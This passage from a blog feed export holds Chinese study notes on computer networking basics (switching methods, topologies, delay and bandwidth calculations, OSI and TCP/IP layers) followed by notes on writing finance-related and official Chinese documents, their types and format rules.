id="电路交换">电路交换</h4><ul><li><p>必须经过“建立连接（占用通信资源）→通话（一直占用通信资源）→释放连接（归还通信资源）”三个步骤的交换方式称为电路交换。</p><p><img src="https://oss.iuoyt.com/img/posts/1709786985605.jpg" alt="电路交换"></p></li><li><p>特点：</p><ul><li>突发性：数据是突发式地出现在传输线路上的</li><li>利用率低：线路上真正用来传送数据的时间往往不到10%甚至1%，已被用户占用的通信线路资源在绝大部分时间里都是空闲的。</li></ul></li></ul><h4 id="分组交换">分组交换</h4><ul><li><p>分组交换采用存储转发技术，把一个报文划分为几个分组后再进行传送。每一个数据段前面都会加上一些必要的控制信息组成首部（header），包括目的地址、源地址等重要信息。</p><p><img src="https://oss.iuoyt.com/img/posts/1709787209313.jpg" alt="分组"></p></li><li><p>分组交换网中的结点交换机根据收到的分组首部中的地址信息，把分组转发到下一个结点交换机。每个分组在互联网中独立地选择传输路径。用这样的存储转发方式，最后分组就能到达最终目的地。</p><p><img src="https://oss.iuoyt.com/img/posts/1709787122005.jpg" alt="分组交换"></p></li><li><p>优点：</p><ul><li>高效：再分组传输的过程中动态分配传输带宽，对通信链路逐段占用</li><li>灵活：为每一个分组独立地选择最合适的转发路由</li><li>迅速：以分组作为传送单位，不先建立连接就能向其他主机发送分组</li><li>可靠：保证可靠性的网络协议，分布式多路由的分组交换网使得网络有很好的生存性</li></ul></li><li><p>缺点：</p><ul><li>造成一定的时延：分组在各路由器存储转发时需要排队</li><li>造成一定的开销：数据在转发过程中可能会丢失</li></ul></li></ul><h4 id="交换方式的对比">交换方式的对比</h4><ul><li><p>若要连续传送大量的数据，且其传送时间远大于连接建立时间，则电路交换的传输速率较快。</p></li><li><p>报文交换和分组交换不需要预先分配传输带宽，在传送突发数据时可提高整个网络的信道利用率。</p></li><li><p>由于一个分组的长度往往远小于整个报文的长度，因此分组交换比报文交换的时延小，同时也具有更好的灵活性。</p></li></ul><p><img src="https://oss.iuoyt.com/img/posts/1709787450436.jpg" alt="三种交换方式"></p><h2 id="计算机网络的类别🌟">计算机网络的类别🌟</h2><h3 id="计算机网络的定义">计算机网络的定义</h3><ul><li>计算机网络主要是由一些通用的、可编程的硬件互联而成的，而这些硬件并非专门用来实现某一特定目的。这些可编程的硬件能够用来传送多种不同类型的数据，并能支持广泛的目的和日益增长的应用。</li></ul><h3 id="网络分类">网络分类</h3><h4 id="按照作用范围">按照作用范围</h4><ol><li>广域网WAN（Wide Area Network）：几十到几千公里，可以跨越不同的国家</li><li>城域网MAN（Metropolitan Area Network）：5~50公理，一般覆盖一个城市，或者几个街区</li><li>局域网LAN（Local Area Network）：通常局限在较小范围，满足某个特定区域内的局域互联需求</li><li>个人区域网PAN（Personal Area Network）：10米左右，使用无线技术连接起来的网络</li></ol><h4 id="按照使用者">按照使用者</h4><ol><li>公用网（public network）：即公众网，缴纳费用就可以使用的网络</li><li>专用网（private network）：某个部门为了满足本单位特殊业务需要而建造的网络</li></ol><h4 id="用来把用户接入到互联网的网络">用来把用户接入到互联网的网络</h4><ul><li>接入网AN（Access Network）又称为本地接入网或居民接入网，实际上是本地ISP拥有的网络，借助多种接入网技术可以把用户的端系统连接到互联网。接入网既不是互联网的核心部分，也不是互联网的边缘部分。</li></ul><h4 id="按照拓扑结构">按照拓扑结构</h4><ul><li>广播信道通信子网中的基本拓扑结构：总线型、环型、星型</li><li>点-点线路的通信子网中的基本拓扑结构：环型、星型、网状</li></ul><h5 id="总线型">总线型</h5><p><img src="https://oss.iuoyt.com/img/posts/image-20240307121830974.png" alt="总线型拓扑结构"></p><ul><li><p>总线型适用于计算机数目相对较少的局域网络，网络连接选用同轴电缆，如传统以太网。</p></li><li><p>特点：</p><ul><li>结构简单，可靠性好</li><li>各结点共用总线，广播式传输</li><li>扩充性好，增减结点容易</li><li>总线争用，故障后果严重、诊断困难，传输率低</li></ul></li><li><p>演变结构：树型拓扑</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240307123138338.png" alt="树型拓扑"></p><ul><li>非常适用于构建网络主干，一般采用光纤作为网络主干，用于军事单位、政府单位等上下界限相当严格和层次分明的网络结构</li><li>特点：<ul><li>总线型结构的扩展</li><li>在总线网上加上分支形成</li><li>容错能力较好</li><li>广播式传输</li><li>扩充性好，增减结点容易</li><li>与星型拓扑类似，对根节点要求高</li></ul></li></ul></li></ul><h5 id="星型">星型</h5><p><img src="https://oss.iuoyt.com/img/posts/image-20240307121844393.png" alt="星型拓扑结构"></p><ul><li>星型拓扑结构是局域网普遍采用的一种拓扑结构，一般使用双绞线或光纤作为传输介质。</li><li>特点：<ul><li>所有结点与中央结点连接(switch or hub)</li><li>结构简单、控制简单、稳定</li><li>易于网络的扩展</li><li>结点出现故障易于诊断与隔离</li><li>易于提高网络的传输速度</li><li>中央结点的可靠性、布线费用大、资源共享能力较差</li></ul></li></ul><h5 id="环型">环型</h5><p><img src="https://oss.iuoyt.com/img/posts/image-20240307121856700.png" alt="环型拓扑结构"></p><ul><li>适用于局域网，结点个数有限</li><li>优点：<ul><li>结构简单、传输延时确定</li><li>资源共享性好</li><li>采用令牌控制</li><li>实时控制</li></ul></li><li>缺点：<ul><li>各结点共享环路，结点出现故障，网络瘫痪</li><li>扩展不易</li></ul></li></ul><h5 id="网状">网状</h5><p><img src="https://oss.iuoyt.com/img/posts/image-20240307121927075.png" alt="网状拓扑结构"></p><ul><li>一般用于Internet骨干网上，使用路由算法来计算发送数据的最佳路径。</li><li>特点：<ul><li>端结点之间存在多条通路，需选择路径</li><li>可靠性高、传输速率高、容错性好</li><li>通信控制复杂</li></ul></li></ul><h2 id="计算机网络的性能🌟">计算机网络的性能🌟</h2><div class="note info flat"><ul><li><p>存储容量单位：数据块大小的基本单位B（Byte字节）。</p><p>$1Byte=8bits$</p><p>$1KB=1024B=2^{10}B$</p><p>$1MB=1024KB=2^{20}B$​</p></li></ul></div><div class="note info flat"><ul><li><p>速率基本单位：数据率的单位bit/s（bps，b/s），比特每秒。</p><p>$1kbps=10^3bps$</p><p>$1Mbps=10^6bps$</p><p>$1Gbps=10^9bps$</p></li></ul></div><h3 id="性能指标">性能指标</h3><h4 id="速率">速率</h4><ul><li>速率是计算机网络中最重要的一个性能指标，指的是数据的传送速率，它也称为数据率 (data rate) 或比特率 (bit rate)。</li><li>单位：bit/s（bps）、kbit/s、Mbit/s、 Gbit/s……</li><li>速率往往是指额定速率或标称速率，非实际运行速率。</li></ul><h4 id="带宽">带宽</h4><ul><li><p>带宽（bandwidth）用来表示网络中某通道传送数据的能力，表示在单位时间内网络中的某信道所能通过的“最高数据率”。</p></li><li><p>单位：bit/s（bps）、kbit/s、Mbit/s、 Gbit/s……</p><p><img src="https://oss.iuoyt.com/img/posts/1709788462342.jpg" alt="带宽"></p></li></ul><h4 id="吞吐量">吞吐量</h4><ul><li>吞吐量 (throughput) 表示在单位时间内通过某个网络（或信道、接口）的数据量。吞吐量更经常地用于对现实世界中的网络的一种测量，以便知道实际上到底有多少数据量能够通过网络。</li><li>吞吐量受网络的带宽或网络的额定速率的限制。</li></ul><h4 id="时延">时延</h4><ul><li><p>时延 (delay 或 latency) 是指数据（一个报文或分组，甚至比特）从网络（或链路）的一端传送到另一端所需的时间，有时也称为延迟或迟延。时延由四个不同的部分组成：</p><ol><li><a href="#%E5%8F%91%E9%80%81%E6%97%B6%E5%BB%B6">发送时延</a></li><li><a href="#%E4%BC%A0%E6%92%AD%E6%97%B6%E5%BB%B6">传播时延</a></li><li><a href="#%E5%A4%84%E7%90%86%E6%97%B6%E5%BB%B6">处理时延</a></li><li><a href="#%E6%8E%92%E9%98%9F%E6%97%B6%E5%BB%B6">排队时延</a></li></ol><p><img src="https://oss.iuoyt.com/img/posts/1709788684936.jpg" alt="各部分时延产生的地方"></p></li></ul><h5 id="发送时延ts">发送时延ts</h5><ul><li><p>也称为传输时延。发送数据时，数据帧从结点进入到传输媒体所需要的时间。也就是从发送数据帧的第一个比特算起，到该帧的最后一个比特发送完毕所需的时间。</p></li><li><p>计算方法：$发送时延=\frac{数据帧长度(bit)}{发送速率(bps)}$​</p><p>对于一定的网络，发送时延并非固定不变，而是与发送的帧长度成正比，与发送速率成反比。</p>  <details class="folding-tag" ><summary> 10MB数据块在传输数率为1Mbps的信道上发送，发送时延为？ </summary>              <div class='content'>              <p>发送时延：$\frac{10\times 2^{20}\times 8}{10^6bps}=83.89s$</p>              </div>            </details></li></ul><h5 id="传播时延tp">传播时延tp</h5><ul><li><p>电磁波在信道中需要传播一定的距离而花费的时间。 发送时延与传播时延有本质上的不同。信号发送速率和信号在信道上的传播速率是完全不同的概念。</p></li><li><p>计算方法：$传播时延=\frac{信道长度(m)}{电磁波在信道上的传播速率(m/s)}$​</p>  <div class="note info flat"><p>电磁波在真空（空气）中的传播速率为$3×10^8m/s$，在电缆中的传播速率要比在真空中的略低，约为$2.3×10^8m/s$，在光纤中的传播速率约为$2.0×10^8m/s$​。</p></div>  <details class="folding-tag" ><summary> 1000km长的光纤线路带来的传播时延 </summary>              <div class='content'>              <p>传播时延：$\frac{10^6m}{2.0\times 10^8m/s}=5ms$</p>              </div>            </details></li></ul><h5 id="处理时延">处理时延</h5><ul><li>主机或路由器在收到分组时，为处理分组（例如分析首部、提取数据、差错检验或查找路由）所花费的时间。</li></ul><h5 id="排队时延">排队时延</h5><ul><li>分组在路由器输入输出队列中排队等待处理所经历的时延，排队时延的长短往往取决于网络中当时的通信量。</li></ul><h5 id="总时延">总时延</h5><ul><li><p>总时延 = 发送时延  + 传播时延  + 处理时延  + 排队时延。</p>  <details class="folding-tag" ><summary> 综合计算 </summary>              <div class='content'>              <blockquote><p>收发两端之间的传输距离为$1000km$，信号在媒体上的传播速率为$2×10^8m/s$。试计算以下两种情况的发送时延和传播时延：<br>（1） 数据长度为$10^7bit$,数据发送速率为$100kb/s$。<br>（2） 数据长度为$10^3bit$,数据发送速率为$1Gb/s$。<br>（3）从上面的计算中可以得到什么样的结论？</p></blockquote><ol><li>发送时延：$ts=\frac{10^7bit}{10^5bps}=100s$<br>传播时延：$tp=\frac{10^6m}{2×10^8m/s}=0.005s=5ms$</li><li>发送时延：$ts=\frac{10^3bit}{10^9bps}=1μs$<br>传播时延：$tp=\frac{10^6m}{2×10^8m/s}=0.005s=5ms$​</li><li>若数据长度大而发送速率低，则在总的时延中，发送时延往往大于传播时延。<br>但若数据长度短而发送速率高，则传播时延就可能是总时延中的主要成分。</li></ol>              </div>            </details></li><li><p>对于高速网络链路，我们提高的仅仅是数据的发送速率而不是比特在链路上的传播速率。</p></li><li><p>提高链路带宽减小了数据的发送时延。</p></li><li><p>“在高速链路（或高带宽链路）上，比特会传送得更快些”的说法是错误的</p></li></ul><h4 id="时延带宽积">时延带宽积</h4><ul><li><p>链路的时延带宽积又称为以比特为单位的链路长度。 只有在代表链路的管道都充满比特时，链路才得到了充分利用。</p><p><img src="https://oss.iuoyt.com/img/posts/1710255427317.jpg" alt="时延带宽积"></p></li><li><p>$时延带宽积=传播时延\times 带宽$</p></li></ul><h4 id="往返时间RTT">往返时间RTT</h4><ul><li>往返时间 RTT (round-trip time) 表示<strong>从发送方发送数据开始，到发送方收到来自接收方的确认</strong>，总共经历的时间。在互联网中，往返时间还包括各中间结点的处理时延、排队时延以及转发数据时的发送时延。</li></ul><h4 id="利用率">利用率</h4><ul><li><p>分为<strong>信道利用率</strong>和<strong>网络利用率</strong>。</p><ul><li>信道利用率指出某信道有百分之几的时间是被利用的（有数据通过）。完全空闲的信道的利用率是零。</li><li>网络利用率则是全网络的信道利用率的加权平均值。</li></ul></li><li><p>信道利用率并非越高越好。当某信道的利用率增大时，该信道引起的时延也就迅速增加。若令$D_0$表示网络空闲时的时延，$D$表示网络当前的时延，则在适当的假定条件下，可以用下面的简单公式表示$D$和$D_0$之间的关系： $D=\frac{D_0}{1-U}$。其中$U$是网络的利用率，数值在$0\sim 1$​之间。</p><p><img src="https://oss.iuoyt.com/img/posts/1710255712676.jpg" alt="时延与网络利用率的关系"></p></li></ul><h3 id="非性能特征">非性能特征</h3><ul><li>非性能特征主要包括：费用、质量、标准化、可靠性、可扩展性和可升级性、易于管理和维护。</li></ul><h2 id="计算机网络的体系结构🌟">计算机网络的体系结构🌟</h2><h3 id="计算机网络体系结构的形成">计算机网络体系结构的形成</h3><ul><li>为了使不同体系结构的计算机网络都能互连，国际标准化组织 ISO 于 1977 年成立了专门机构研究该问题。他们提出了一个试图使各种计算机在世界范围内互连成网的标准框架，即著名的<strong>开放系统互连基本参考模型OSI/RM</strong> (Open Systems Interconnection Reference Model)，简称为 OSI。</li><li>OSI并没有得到市场的认可，非国际标准 TCP/IP 却获得了最广泛的应用。TCP/IP 常被称为事实上的国际标准。</li><li>OSI失败的原因：<ul><li>OSI 的专家们在完成 OSI 标准时没有商业驱动力；<br>OSI 的协议实现起来过分复杂，且运行效率很低；<br>OSI 标准的制定周期太长，因而使得按 OSI 标准生产的设备无法及时进入市场；<br>OSI 的层次划分也不太合理，有些功能在多个层次中重复出现。</li></ul></li></ul><h3 id="协议与划分层次">协议与划分层次</h3><h4 id="网络协议的三个组成要素">网络协议的三个组成要素</h4><ul><li>语法（数据与控制信息的结构或格式）</li><li>语义（需要发出何种控制信息，完成何种动作以及做出何种响应）</li><li>同步（事件实现顺序的详细说明）</li></ul><h4 id="协议的两种形式">协议的两种形式</h4><ul><li>文字描述：便于人阅读和理解的形式</li><li>程序代码：让计算机能够理解的形式</li><li>这两种不同形式的协议都必须能够对网络上信息交换过程做出精确的解释。</li></ul><h4 id="分层的优缺点">分层的优缺点</h4><ul><li>优点：<ul><li>各层之间是独立的</li><li>灵活性好</li><li>结构上可分割开</li><li>易于实现和维护</li><li>能促进标准化工作</li></ul></li><li>缺点：<ul><li>降低效率</li><li>有些功能会在不同的层次中重复出现，因而产生了额外开销</li></ul></li></ul><h4 id="各层完成的主要功能">各层完成的主要功能</h4><ul><li>差错控制：使相应层次对等方的通信更加可靠。</li><li>流量控制：发送端的发送速率必须使接收端来得及接收，不要太快。</li><li>分段和重装：发送端将要发送的数据块划分为更小的单位，在接收端将其还原。</li><li>复用和分用：发送端几个高层会话复用一条低层的连接，在接收端再进行分用。</li><li>连接建立和释放：交换数据前先建立一条逻辑连接，数据传送结束后释放连接。</li></ul><h2 id="五层体系结构">五层体系结构</h2><ul><li><p>OSI 的七层协议体系结构的概念清楚，理论也较完整，但它既复杂又不实用。</p></li><li><p>TCP/IP 是四层体系结构，但最下面的网络接口层并没有具体内容。</p></li><li><p>在学习计算机网络原理时往往采取折中的办法，即综合 OSI 和 TCP/IP 的优点，采用一种只有五层协议的体系结构 。</p><p><img src="https://oss.iuoyt.com/img/posts/1710256503553.jpg" alt="计算机网络五层体系结构"></p></li></ul><h3 id="OSI七层协议体系结构">OSI七层协议体系结构</h3><ul><li><strong>物理层</strong>：利用传输介质为通信的网络结点之间建立、管理和释放物理连接；实现比特流的透明传输，为数据链路层提供数据传输服务；物理层的数据传输单元是比特。</li><li><strong>数据链路层</strong>：在物理层提供的服务基础上，数据链路层在通信的实体间建立数据链路连接；传输以“帧”为单位的数据包；采用差错控制与流量控制方法，使有差错的物理线路变成无差错的数据链路。</li><li><strong>网络层</strong>：通过路由选择算法为分组通过通信子网选择最适当的路径；为数据在结点之间传输创建逻辑链路；实现拥塞控制、网络互连等功能。</li><li><strong>传输层</strong>：可提供可靠端到端（end-to-end）服务；处理数据包错误、数据包次序，以及其他一些关键传输问题；传输层向高层屏蔽了下层数据通信的细节，是计算机通信体系结构中关键的一层。</li><li><strong>会话层</strong>：负责维护两个结点之间的传输链接，以便确保点对点传输不中断，管理数据交换。</li><li><strong>表示层</strong>：用于处理在两个通信系统中交换信息的表示方式，数据格式变换、数据加密与解密、数据压缩与恢复。</li><li><strong>应用层</strong>：为应用程序提供了网络服务；应用层需要识别并保证通信对方的可用性，使得协同工作的应用程序之间的同步；建立传输错误纠正与保证数据完整性的控制机制。</li></ul><h3 id="五层协议">五层协议</h3><p><img src="https://oss.iuoyt.com/img/posts/1710256837540.jpg" alt="发送数据"></p><h2 id="实体、协议、服务和服务访问点">实体、协议、服务和服务访问点</h2><ul><li>实体：任何可发送或接收信息的硬件或软件进程</li><li>协议：控制两个对等实体（或多个实体）进行通信的规则的集合</li><li>在协议的控制下，两个对等实体间的通信使得本层能向上一层提供服务。要实现本层协议，还需要使用下面一层所提供的服务。协议可以向上提供服务，而被服务的实体无法看到具体的协议。即<strong>协议是“水平的”</strong>（控制对等实体之间通信的规则），<strong>服务是“垂直的”</strong>（服务是由下层向上层通过层间接口提供的）。</li><li>上层使用下层所提供的服务必须通过与下层交换一些命令，这些命令在OSI中被称为<strong>服务原语</strong>。</li><li>在同一系统中相邻两层的实体进行交互的地方被称作<strong>服务访问点SAP</strong>（Service Access Point），层与层之间交换的数据的单位称为<strong>服务数据单元SDU</strong>（Service Data Unit）。</li></ul><h2 id="TCP-IP体系结构">TCP/IP体系结构</h2><ul><li><p>现在的互联网使用的 TCP/IP 体系结构有时已经发生了演变，即某些应用程序可以直接使用 IP 层，或甚至直接使用最下面的网络接口层。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240316153110141.png" alt="TCP/IP体系结构的一种表示方法"></p><p><img src="https://oss.iuoyt.com/img/posts/1710574457212.jpg" alt="沙漏计时器形状的TCP/IP协议族示意"></p><p><img src="https://oss.iuoyt.com/img/posts/1710574181311.jpg" alt="在应用层的客户进程和服务器进程的交互"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>财经应用文写作方式</title>
      <link href="/posts/70666095.html"/>
      <url>/posts/70666095.html</url>
      
        <content type="html"><![CDATA[<h2 id="财经应用文写作概述">财经应用文写作概述</h2><h3 id="应用文写作的特点">应用文写作的特点</h3><ul><li>实用性：为解决实际问题而写作</li><li>程式性：有惯用格式和语体风格</li><li>时效性：在特定时间处理特定问题</li></ul><h3 id="应用文写作要求">应用文写作要求</h3><h4 id="主旨明确单一">主旨明确单一</h4><ul><li><p>主旨即主题，指作者在全部文章内容中表达的基本观点和写作意图的体现，是一篇文章的核心、总纲。</p></li><li><p>特点：</p><ul><li>正确（符合政策）</li><li>单一（一文一旨）</li><li>鲜明</li><li>深刻</li></ul></li><li><p>如何确立与表现主旨？</p><ul><li><p>篇名点旨（标题）</p></li><li><p>篇首亮旨（开头）</p></li><li><p>篇中明旨（各段首句/小标题）</p><p>最常用方法：撮要标目法（起句立意法），将段主旨提炼出为首句或标题</p><p>处理要求：</p><ol><li>观点概括要准确简洁</li><li>几个观点一般要求字数、结构形式的一致</li></ol><p>处理形式：</p><ol><li>小标题形式</li><li>短语句</li></ol></li></ul></li></ul><h4 id="材料真实典型">材料真实典型</h4><ul><li>材料类型：<ul><li>直接材料和间接材料</li><li>历史材料和现实材料</li><li>典型材料和概括材料</li><li>正面材料和反面材料</li><li>文字说明材料和数据统计材料</li></ul></li><li>选材的要求：<ul><li>切题：符合主旨的需要</li><li>真实：合乎实际</li><li>合理：有代表性，说服力强</li></ul></li><li>材料获取的来源：<ul><li>感受和观察</li><li>调查和采访</li><li>检索和阅读</li></ul></li></ul><h4 id="体适恰当规范">体适恰当规范</h4><ul><li><p>注意的三个方面：</p><ol><li>外部结构格式：文章外在各个组成部分</li><li>正文篇章结构</li><li>内部逻辑结构：思路在文章中的反应</li></ol></li><li><p>要求：</p><ol><li>完整严密</li><li>适应文体</li></ol></li><li><p>结构安排的6个方面：</p><ul><li><p>层次：应用文种思想观点或情节的次序和地位</p></li><li><p>段落</p></li><li><p>开头：一要适应主旨要求，自然引发全文；二是自然和谐、凝练明快；三是力争新颖。</p><p>4种方式：①揭示全文内容；②说明发文的背景；③起因和动机；④交代依据</p></li><li><p>结尾：①总结全文式；②呼应开头式；③号召希望式；④表示决心式；⑤提出要求式</p></li><li><p>过渡：上下文之间的衔接转换</p></li><li><p>照应：前后内容的关照呼应</p></li></ul></li></ul><h4 id="语言简明得体">语言简明得体</h4><ul><li>写作一般分为两种文体：<ul><li>文艺语体</li><li>实用语体</li></ul></li><li>应用文的务实功能决定了其篇幅一般较短，要写得简明扼要。尽量用最少的文字，准确、严密地表现最丰富的内容。</li></ul><h3 id="财经应用文的特点">财经应用文的特点</h3><p>（政策性强、专业性强、多用数据）</p><ol><li>真实性：实事求是，如实反映经济实践的过程和需求。解决实际问题。<ul><li>材料绝对真实</li><li>观点结论必须正确真实</li></ul></li><li>政策性：内容上的真实性决定了其政策性，其是在国家财经法规、规章、政策的指导下进行的</li><li>实用性：为了解决财经工作中的实际问而提出意见、措施、办法、对策或设想、建议。</li><li>规范性：格式、文件处理、用语、文种、语体、布局等有要求。</li></ol><h3 id="章节主要知识点总结">章节主要知识点总结</h3><ol><li><details class="folding-tag" ><summary> 应用文的主要作用有 </summary>              <div class='content'>              <p>规范指导作用、联系交流作用、宣传教育作用、凭证资料作用</p>              </div>            </details></li><li><details class="folding-tag" ><summary> 应用文常用的结尾方式有 </summary>              <div class='content'>              <p>总结全文式、呼应开头式、号召希望式、表示决心式、提出要求式</p>              </div>            </details></li><li><details class="folding-tag" ><summary> 财经应用文写作的特点包括 </summary>              <div class='content'>              <p>真实性、政策性、实用性、规范性</p>              </div>            </details></li><li><details class="folding-tag" ><summary> 财经应用文写作的结构要求做到 </summary>              <div class='content'>              <ul><li>完整严谨，比例恰当</li><li>层次分明，条理清楚</li><li>前后连贯，首尾圆和</li></ul>              </div>            </details></li><li><details class="folding-tag" ><summary> 财经应用文结构的常式包括 </summary>              <div class='content'>              <p>总分式、并列式、递进式、连贯式</p>              </div>            </details></li><li><details class="folding-tag" ><summary> 什么是财经应用文 </summary>              <div class='content'>              <p>财经应用文是应用文的一个分支。狭义的财经应用文，专指各类只为财经工作所用的财经专业文书，是专门用于经济活动的经济应用文体的统称。广义的财经应用文，是人们在财经工作中所使用的各类反映经济活动内容的文书的统称，既包括财经专业文书，也包括一些同时在其他社会领域或部门广泛应用的文书。</p>              </div>            </details></li><li><details class="folding-tag" ><summary> 财经应用文有哪些特点 </summary>              <div class='content'>              <ol><li>真实性：实事求是，如实反映经济实践的过程和需求。解决实际问题。<ul><li>材料绝对真实</li><li>观点结论必须正确真实</li></ul></li><li>政策性：内容上的真实性决定了其政策性，其是在国家财经法规、规章、政策的指导下进行的</li><li>实用性：为了解决财经工作中的实际问而提出意见、措施、办法、对策或设想、建议。</li><li>规范性：格式、文件处理、用语、文种、语体、布局等有要求。</li></ol>              </div>            </details></li><li><details class="folding-tag" ><summary> 财经应用文结构的常式有哪些 </summary>              <div class='content'>              <ol><li>总分式：先总后分式、先分后总式、总分总式</li><li>并列式：分条列项式（按性质分成若干条项予以表述，每一条项冠以数目字）、内在法条式（法规、规章类文件）</li><li>递进式：以事物或某种经济现象为脉络，而阐明一定道理或观点的一种结构形态，即各层次之间是“进层”关系，彼此互为因果</li><li>连贯式：以时间为顺序，或者以事情为顺序</li></ol>              </div>            </details></li></ol><h2 id="常用公务文书">常用公务文书</h2><h3 id="公文的特点">公文的特点</h3><ol><li>作者的法定性</li><li>读者的特定性</li><li>法定的权威性</li><li>体式的规范性</li></ol><h3 id="公文的种类">公文的种类</h3><h4 id="公文种类">公文种类</h4><ol><li>决议：会议讨论通过的重大决策事项</li><li>决定：对重要事项的决策和部署等决定事项</li><li>命令（令）（部委级以上，下行文）：公布行政法规和规章、宣布重大措施</li><li>公报：公布重要决定或重大事项</li><li>公告：向国内外宣布重要事项或法定事项</li><li>通告：在一定范围内公布应当遵守或周知的事项</li><li>意见：对重要问题提出见解或处理办法</li><li>通知（下行文）：发布、传达下级机关执行事项，批转/转发公文</li><li>通报（下行文）：表彰先进，批评错误，传达重要精神，告知重要情况</li><li>报告（上行文）：向上级机关汇报工作、反映情况，回复上级机关询问</li><li>请示（上行文）：向上级机关请求指示、批准</li><li>批复（下行文）：答复下级机关请示事项</li><li>议案：各级人民政府向同级人代会/人大常委会提请审议事项</li><li>函（平行文）：不相隶属机关之间商洽工作、询问和答复问题、请求批准和答复审批事项</li><li>纪要：记载会议主要情况和议定事项</li></ol><h4 id="文种的选择">文种的选择</h4><ol><li>发文目的</li><li>行文关系（上下级，平级，不相隶属）</li><li>行文方向<ul><li>上行文：向上级机关发文</li><li>下行文：向下级机关发文</li><li>平行文：不相隶属机关</li><li>泛行文：公告之类，没有明确收方</li></ul></li></ol><h3 id="公文的格式">公文的格式</h3><h4 id="版头">版头</h4><p>公文首页红色分隔线以上的部分</p><h5 id="份号">份号</h5><ul><li>涉密公文顶格编排在版心左上角第一行，用6位阿拉伯数字标注的顺序编号。</li></ul><h5 id="密级和保密期限">密级和保密期限</h5><ul><li>对公文秘密等级及时效的规定，顶格编排在版心左上角第二行，数字用阿拉伯数字，密级和期限用★隔开。</li><li>涉密程度：绝密、机密、秘密</li></ul><h5 id="紧急程度">紧急程度</h5><ul><li>公文送达和办理的时限要求，顶格编排在版心左上角第三行</li><li>紧急程度：特急、加急</li></ul><h5 id="发文机关标志">发文机关标志</h5><ul><li>一般由发文机关全程或者规范化简称加“文件”二字组成，对于上行文可以只标志发文机关全称或规范化简称。</li><li>一般文件缀“文件”，命令缀“命令”，信函缀“函件”或不缀，纪要缀：纪要</li></ul><h5 id="发文字号">发文字号</h5><ul><li>由发文机关代字、年份、年度发文顺序号组成，发文机关标志下空两行居中位置</li><li>全称年份用六角括号“〔〕”，发文序号不加“第”，后加“号”，不编虚位0，</li></ul><h5 id="签发人">签发人</h5><ul><li>上行文需要标注签发人姓名，“签发人：”+名字</li></ul><h4 id="主体">主体</h4><p>首页红色分隔线以下、公文末页首条分隔线以上的部分</p><h5 id="标题">标题</h5><ul><li>由发文机关名称、事由和文种组成，回行需要词义完整，排列对称，长短适宜，间距恰当，排列呈梯形或菱形。</li><li>格式：XX机关+关于+事项+文种</li></ul><h5 id="主送机关">主送机关</h5><ul><li>主要受理机关，使用全称、规范化简称或同类型机关统称（“各有关单位”）</li></ul><h5 id="正文">正文</h5><ul><li>正文“三段式”结构：<ol><li>发文原由</li><li>发文事项</li><li>发文要求</li></ol></li></ul><h5 id="附件说明">附件说明</h5><ul><li><p>公文附件的顺序号和名称，有明确的附件文件时无需单独编排附件部分</p></li><li><p>格式：</p><blockquote><p>附件：1. ××××××（换行需要对齐首字）</p><p>2. ××××××（每行后方不加标点符号）</p></blockquote></li></ul><h5 id="发文机关署名">发文机关署名</h5><ul><li>署发文机关全称或规范化简称</li></ul><h5 id="成文日期">成文日期</h5><ul><li>签发日期，阿拉伯数字，不编虚位0</li></ul><h5 id="印章">印章</h5><ul><li>加盖发文机关印章，与署名机关相符</li></ul><h5 id="附注">附注</h5><ul><li>公文印发穿大范围等需要说明的事项</li></ul><h5 id="附件">附件</h5><ul><li>另面编排，与正文一起装订</li></ul><h4 id="版记">版记</h4><p>公文末页首条分隔线以下、末条分隔线以上的部分</p><h5 id="抄送机关">抄送机关</h5><ul><li>需要执行或者知晓公文内容的其他机关，使用全称、规范化简称或同类型机关统称</li></ul><h5 id="印发机关和印发日期">印发机关和印发日期</h5><h3 id="通知（下行文）">通知（下行文）</h3><ul><li>通知适用于批转下级机关的公文，转发上级机关和不相隶属机关的公文，发布文件；传达要求下级机关办理和需要有关单位周知或者执行的事项；任免人员。</li></ul><h4 id="主要类型">主要类型</h4><ol><li><p>指示性通知</p><p>有关行政法规和规章、办法、措施，不宜用命令发布的。</p></li><li><p>批示性通知（批转、转发、印发性通知）</p><p>用于发布某些行政法规，转发上级、同级或不相隶属机关的公文以及批转下级机关的公文。</p><p>印发标题格式：发文单位+关于印发+事项（方案、意见等）+通知</p><p>转发标题格式：发文单位+关于转发+事项（方案、意见等）+通知</p><p>（转发文也为通知时，去除内层“的通知”后缀，层层转发只标明最初发文单位，仅当转发为条例规章才加书名号）</p></li><li><p>事项性通知（工作通知）</p><p>要求下级机关办理某些事项，提出工作原则和要求等，具有强制性和行政约束力。</p></li><li><p>知照性通知（通常没有受文单位）</p><p>用于告知某一事项或某些信息的通知</p></li></ol><h3 id="请示（上行文）">请示（上行文）</h3><h4 id="适用范围（三“无”-三“请”）">适用范围（三“无”+三“请”）</h4><ul><li>无法——请求解答<ol><li>请求上级机关对方针、政策等作出明确解释和答复的</li><li>需要上级机关对某项政策做出变通处理的请示</li><li>无章可循、无法可依，需要上级机关指示的</li></ol></li><li>无力——请求帮助<ol><li>需要上级解决某一具体问题和实际困难的</li><li>本部门无法独立解决困难和问题的</li></ol></li><li>无权——请求审批<ol><li>按照规定未经有关部门批准无权自行处理的问题</li></ol></li></ul><h4 id="特点">特点</h4><ul><li>陈请性</li><li>期复性</li><li>超前性（事前行文）</li><li>单一性（一文一事）</li></ul><h4 id="主要类型-2">主要类型</h4><ul><li>政策性</li><li>事项性</li></ul><h3 id="函（平行文）">函（平行文）</h3><ul><li>函适用于不相隶属机关指尖商洽工作、询问和答复问题、请求批准和答复审批事项。</li><li>不具有指令性，而是商洽性的。</li><li>按照往来关系可以分为去函和复函（需要引述来文情况，“~~收悉”）</li></ul><h4 id="适用范围">适用范围</h4><ol><li>平级机关或不相隶属机关单位指尖的商洽性、询问性和答复性公务联系。</li><li>向无隶属关系的业务主管部门请求批示有关事项。</li><li>业务主管部门答复或审批无隶属关系的机关请示批准的事项。</li><li>机关单位对个人的公务联系。</li></ol><h4 id="主要类型-3">主要类型</h4><ol><li>商洽函</li><li>询问答复函</li><li>请批、批准函</li></ol><h2 id="市场调研报告">市场调研报告</h2><h3 